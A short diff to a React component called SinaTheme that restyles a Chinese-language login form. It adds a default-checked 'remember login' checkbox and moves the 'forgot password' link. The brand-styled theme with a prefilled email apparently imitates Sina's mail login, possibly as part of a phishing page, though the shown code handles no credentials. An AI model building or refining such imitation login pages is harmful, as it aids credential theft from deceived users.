@@ -114,7 +114,7 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                 />
               </div>
 
-              <div className="space-y-1">
+              <div className="relative">
                 <input 
                   type="password" 
                   placeholder="输入密码" 
@@ -122,9 +122,14 @@ const SinaTheme: React.FC<SinaThemeProps> = ({ prefilledEmail }) => {
                   onChange={(e) => setPassword(e.target.value)}
                   className="w-full px-4 py-2.5 text-[14px] border border-gray-300 rounded focus:outline-none focus:border-[#00a6e0] focus:ring-1 focus:ring-[#00a6e0]/20"
                 />
-                <div className="text-right">
-                  <a href="#" className="text-[12px] text-[#00a6e0] hover:underline">忘记密码？</a>
-                </div>
+              </div>
+
+              <div className="flex items-center justify-between text-[12px] text-gray-500">
+                <label className="flex items-center cursor-pointer">
+                  <input type="checkbox" className="mr-1.5 accent-[#00a6e0]" defaultChecked />
+                  记住登录状态
+                </label>
+                <a href="#" className="text-[#00a6e0] hover:underline">忘记密码？</a>
               </div>
 
               <div className="flex space-x-3">
